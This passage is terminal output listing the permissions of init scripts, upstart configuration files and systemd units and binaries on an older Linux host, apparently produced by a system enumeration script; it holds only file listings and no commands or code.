-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Nov 30  2017 uuidd


[00;31m[-] /etc/init/ config file permissions:[00m
total 132
drwxr-xr-x  2 root root 4096 Mar  8  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rw-r--r--  1 root root 3709 Mar  3  2017 apparmor.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1105 Mar 21  2016 dovecot.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  641 Mar 16  2017 ssh.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf


[00;31m[-] /lib/systemd/* config file permissions:[00m
/lib/systemd/:
total 8.3M
drwxr-xr-x 27 root root  36K Mar  8  2018 system
drwxr-xr-x  2 root root 4.0K Mar  8  2018 system-sleep
drwxr-xr-x  2 root root 4.0K Mar  8  2018 network
drwxr-xr-x  2 root root 4.0K Mar  8  2018 system-generators
drwxr-xr-x  2 root root 4.0K Mar  8  2018 system-preset
-rwxr-xr-x  1 root root 443K Feb  1  2018 systemd-udevd
-rwxr-xr-x  1 root root 1.6M Feb  1  2018 systemd
-rwxr-xr-x  1 root root  47K Feb  1  2018 systemd-binfmt
-rwxr-xr-x  1 root root 143K Feb  1  2018 systemd-shutdown
-rwxr-xr-x  1 root root 103K Feb  1  2018 systemd-bootchart
-rwxr-xr-x  1 root root 268K Feb  1  2018 systemd-cgroups-agent
-rwxr-xr-x  1 root root 301K Feb  1  2018 systemd-fsck
-rwxr-xr-x  1 root root  31K Feb  1  2018 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Feb  1  2018 systemd-hostnamed
-rwxr-xr-x  1 root root 605K Feb  1  2018 systemd-logind
-rwxr-xr-x  1 root root 123K Feb  1  2018 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Feb  1  2018 systemd-random-seed
-rwxr-xr-x  1 root root  51K Feb  1  2018 systemd-remount-fs
-rwxr-xr-x  1 root root  31K Feb  1  2018 systemd-reply-password
-rwxr-xr-x  1 root root 657K Feb  1  2018 systemd-resolved
-rwxr-xr-x  1 root root  71K Feb  1  2018 systemd-sleep
-rwxr-xr-x  1 root root  91K Feb  1  2018 systemd-socket-proxyd
-rwxr-xr-x  1 root root 333K Feb  1  2018 systemd-timedated
-rwxr-xr-x  1 root root 139K Feb  1  2018 systemd-timesyncd
-rwxr-xr-x  1 root root  35K Feb  1  2018 systemd-user-sessions
-rwxr-xr-x  1 root root  15K Feb  1  2018 systemd-ac-power
-rwxr-xr-x  1 root root  55K Feb  1  2018 systemd-activate
-rwxr-xr-x  1 root root  91K Feb  1  2018 systemd-backlight
-rwxr-xr-x  1 root root 352K Feb  1  2018 systemd-bus-proxyd
-rwxr-xr-x  1 root root  91K Feb  1  2018 systemd-cryptsetup
-rwxr-xr-x  1 root root  75K Feb  1  2018 systemd-fsckd
-rwxr-xr-x  1 root root 276K Feb  1  2018 systemd-initctl
-rwxr-xr-x  1 root root 319K Feb  1  2018 systemd-journald
-rwxr-xr-x  1 root root 340K Feb  1  2018 systemd-localed
-rwxr-xr-x  1 root root  51K Feb  1  2018 systemd-modules-load
-rwxr-xr-x  1 root root 828K Feb  1  2018 systemd-networkd
-rwxr-xr-x  1 root root  35K Feb  1  2018 systemd-quotacheck
-rwxr-xr-x  1 root root  91K Feb  1  2018 systemd-rfkill
-rwxr-xr-x  1 root root  51K Feb  1  2018 systemd-sysctl
-rwxr-xr-x  1 root root 276K Feb  1  2018 systemd-update-utmp
-rwxr-xr-x  1 root root 1.3K Oct 26  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 816K
drwxr-xr-x 2 root root 4.0K Mar  8  2018 apache2.service.d
drwxr-xr-x 2 root root 4.0K Mar  8  2018 halt.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 getty.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Mar  8  2018 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Mar  8  2018 timers.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 busnames.target.wants
drwxr-xr-x 2 root root 4.0K Mar  8  2018 systemd-resolved.service.d
-rw-r--r-- 1 root root 1.1K Feb 27  2018 dovecot.service
-rw-r--r-- 1 root root  294 Feb 27  2018 dovecot.socket
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root   28 Feb  1  2018 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Feb  1  2018 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Feb  1  2018 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Feb  1  2018 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root   21 Feb  1  2018 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   27 Feb  1  2018 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root   14 Feb  1  2018 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Feb  1  2018 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Feb  1  2018 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Feb  1  2018 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Feb  1  2018 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Feb  1  2018 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Feb  1  2018 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Feb  1  2018 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Feb  1  2018 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Feb  1  2018 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 reboot.service -> /dev/null
lrwxrwxrwx 1 root root   15 Feb  1  2018 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Feb  1  2018 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Feb  1  2018 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Feb  1  2018 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Feb  1  2018 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountroot.service -> /dev/null
-rw-r--r-- 1 root root  879 Feb  1  2018 basic.target
-rw-r--r-- 1 root root  379 Feb  1  2018 bluetooth.target
-rw-r--r-- 1 root root  358 Feb  1  2018 busnames.target
-rw-r--r-- 1 root root  770 Feb  1  2018 console-getty.service
-rw-r--r-- 1 root root  742 Feb  1  2018 console-shell.service
-rw-r--r-- 1 root root  791 Feb  1  2018 container-getty@.service
-rw-r--r-- 1 root root  394 Feb  1  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Feb  1  2018 cryptsetup.target
-rw-r--r-- 1 root root 1010 Feb  1  2018 debug-shell.service
-rw-r--r-- 1 root root  670 Feb  1  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Feb  1  2018 dev-mqueue.mount
-rw-r--r-- 1 root root 1009 Feb  1  2018 emergency.service
-rw-r--r-- 1 root root  431 Feb  1  2018 emergency.target
-rw-r--r-- 1 root root  501 Feb  1  2018 exit.target
-rw-r--r-- 1 root root  440 Feb  1  2018 final.target
-rw-r--r-- 1 root root 1.5K Feb  1  2018 getty@.service
-rw-r--r-- 1 root root  460 Feb  1  2018 getty.target
-rw-r--r-- 1 root root  558 Feb  1  2018 graphical.target
-rw-r--r-- 1 root root  487 Feb  1  2018 halt.target
-rw-r--r-- 1 root root  447 Feb  1  2018 hibernate.target
-rw-r--r-- 1 root root  468 Feb  1  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  630 Feb  1  2018 initrd-cleanup.service
-rw-r--r-- 1 root root  553 Feb  1  2018 initrd-fs.target
-rw-r--r-- 1 root root  790 Feb  1  2018 initrd-parse-etc.service
-rw-r--r-- 1 root root  526 Feb  1  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  640 Feb  1  2018 initrd-switch-root.service
-rw-r--r-- 1 root root  691 Feb  1  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Feb  1  2018 initrd.target
-rw-r--r-- 1 root root  664 Feb  1  2018 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  501 Feb  1  2018 kexec.target
-rw-r--r-- 1 root root  677 Feb  1  2018 kmod-static-nodes.service
-rw-r--r-- 1 root root  395 Feb  1  2018 local-fs-pre.target
-rw-r--r-- 1 root root  507 Feb  1  2018 local-fs.target
-rw-r--r-- 1 root root  405 Feb  1  2018 machine.slice
-rw-r--r-- 1 root root  473 Feb  1  2018 mail-transport-agent.target
-rw-r--r-- 1 root root  492 Feb  1  2018 multi-user.target
-rw-r--r-- 1 root root  464 Feb  1  2018 network-online.target
-rw-r--r-- 1 root root  461 Feb  1  2018 network-pre.target
-rw-r--r-- 1 root root  480 Feb  1  2018 network.target
-rw-r--r-- 1 root root  514 Feb  1  2018 nss-lookup.target
-rw-r--r-- 1 root root  473 Feb  1  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Feb  1  2018 paths.target
-rw-r--r-- 1 root root  552 Feb  1  2018 poweroff.target
-rw-r--r-- 1 root root  377 Feb  1  2018 printer.target
-rw-r--r-- 1 root root  693 Feb  1  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Feb  1  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  568 Feb  1  2018 quotaon.service
-rw-r--r-- 1 root root  612 Feb  1  2018 rc-local.service
-rw-r--r-- 1 root root  543 Feb  1  2018 reboot.target
-rw-r--r-- 1 root root  396 Feb  1  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Feb  1  2018 remote-fs.target
-rw-r--r-- 1 root root  978 Feb  1  2018 rescue.service
-rw-r--r-- 1 root root  486 Feb  1  2018 rescue.target
-rw-r--r-- 1 root root  500 Feb  1  2018 rpcbind.target
-rw-r--r-- 1 root root 1.1K Feb  1  2018 serial-getty@.service
-rw-r--r-- 1 root root  402 Feb  1  2018 shutdown.target
-rw-r--r-- 1 root root  362 Feb  1  2018 sigpwr.target
-rw-r--r-- 1 root root  420 Feb  1  2018 sleep.target
-rw-r--r-- 1 root root  403 Feb  1  2018 -.slice
-rw-r--r-- 1 root root  409 Feb  1  2018 slices.target
-rw-r--r-- 1 root root  380 Feb  1  2018 smartcard.target
-rw-r--r-- 1 root root  356 Feb  1  2018 sockets.target
-rw-r--r-- 1 root root  380 Feb  1  2018 sound.target
-rw-r--r-- 1 root root  441 Feb  1  2018 suspend.target
-rw-r--r-- 1 root root  353 Feb  1  2018 swap.target
-rw-r--r-- 1 root root  715 Feb  1  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 Feb  1  2018 sysinit.target
-rw-r--r-- 1 root root  719 Feb  1  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Feb  1  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.3K Feb  1  2018 syslog.socket
-rw-r--r-- 1 root root  646 Feb  1  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 Feb  1  2018 systemd-ask-password-console.service
-rw-r--r-- 1 root root  574 Feb  1  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 Feb  1  2018 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Feb  1  2018 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Feb  1  2018 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Feb  1  2018 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Feb  1  2018 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  409 Feb  1  2018 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  497 Feb  1  2018 systemd-exit.service
-rw-r--r-- 1 root root  551 Feb  1  2018 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Feb  1  2018 systemd-fsckd.socket
-rw-r--r-- 1 root root  674 Feb  1  2018 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Feb  1  2018 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Feb  1  2018 systemd-halt.service
-rw-r--r-- 1 root root  631 Feb  1  2018 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Feb  1  2018 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Feb  1  2018 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Feb  1  2018 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Feb  1  2018 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Feb  1  2018 systemd-initctl.service
-rw-r--r-- 1 root root  524 Feb  1  2018 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Feb  1  2018 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Feb  1  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1.3K Feb  1  2018 systemd-journald.service
-rw-r--r-- 1 root root  842 Feb  1  2018 systemd-journald.socket
-rw-r--r-- 1 root root  731 Feb  1  2018 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 Feb  1  2018 systemd-kexec.service
-rw-r--r-- 1 root root  691 Feb  1  2018 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Feb  1  2018 systemd-logind.service
-rw-r--r-- 1 root root  693 Feb  1  2018 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Feb  1  2018 systemd-modules-load.service
-rw-r--r-- 1 root root 1.3K Feb  1  2018 systemd-networkd.service
-rw-r--r-- 1 root root  591 Feb  1  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  685 Feb  1  2018 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 Feb  1  2018 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Feb  1  2018 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Feb  1  2018 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Feb  1  2018 systemd-reboot.service
-rw-r--r-- 1 root root  757 Feb  1  2018 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Feb  1  2018 systemd-resolved.service
-rw-r--r-- 1 root root  696 Feb  1  2018 systemd-rfkill.service
-rw-r--r-- 1 root root  617 Feb  1  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  497 Feb  1  2018 systemd-suspend.service
-rw-r--r-- 1 root root  649 Feb  1  2018 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Feb  1  2018 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Feb  1  2018 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Feb  1  2018 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 Feb  1  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  703 Feb  1  2018 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Feb  1  2018 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  578 Feb  1  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Feb  1  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  825 Feb  1  2018 systemd-udevd.service
-rw-r--r-- 1 root root  823 Feb  1  2018 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Feb  1  2018 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 Feb  1  2018 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Feb  1  2018 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Feb  1  2018 systemd-user-sessions.service
-rw-r--r-- 1 root root  436 Feb  1  2018 system.slice
-rw-r--r-- 1 root root  585 Feb  1  2018 system-update.target
-rw-r--r-- 1 root root  405 Feb  1  2018 timers.target
-rw-r--r-- 1 root root  395 Feb  1  2018 time-sync.target
-rw-r--r-- 1 root root  417 Feb  1  2018 umount.target
-rw-r--r-- 1 root root  528 Feb  1  2018 user@.service
-rw-r--r-- 1 root root  392 Feb  1  2018 user.slice
-rw-r--r-- 1 root root  189 Nov 30  2017 uuidd.service
-rw-r--r-- 1 root root  126 Nov 30  2017 uuidd.socket
-rw-r--r-- 1 root root  420 Nov 29  2017 resolvconf.service
-rw-r--r-- 1 root root  342 Oct 27  2017 getty-static.service
-rw-r--r-- 1 root root  153 Oct 27  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Oct 27  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Oct 27  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  225 Sep 26  2017 apt-daily.service
-rw-r--r-- 1 root root  156 Sep 26  2017 apt-daily.timer
-rw-r--r-- 1 root root  238 Sep 26  2017 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Sep 26  2017 apt-daily-upgrade.timer
lrwxrwxrwx 1 root root   27 Sep 13  2017 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Sep 13  2017 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 Sep 13  2017 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 13  2017 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Sep 13  2017 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Sep 13  2017 plymouth-quit.service
-rw-r--r-- 1 root root  200 Sep 13  2017 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Sep 13  2017 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 13  2017 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 13  2017 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 13  2017 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Sep 13  2017 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 13  2017 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  790 Jun  1  2015 friendly-recovery.service
-rw-r--r-- 1 root root  241 Mar  3  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Apr 12  2016 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 13  2017 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Feb  1  2018 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Feb  1  2018 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 24 Sep 13  2017 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Sep 13  2017 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 28 Sep 13  2017 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 26 Sep 13  2017 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 24 Feb  1  2018 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 20 Feb  1  2018 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Feb  1  2018 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Feb  1  2018 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Feb  1  2018 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Feb  1  2018 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Feb  1  2018 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Feb  1  2018 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Feb  1  2018 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Feb  1  2018 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 27 Feb  1  2018 systemd-journald.service -> ../systemd-journald.service
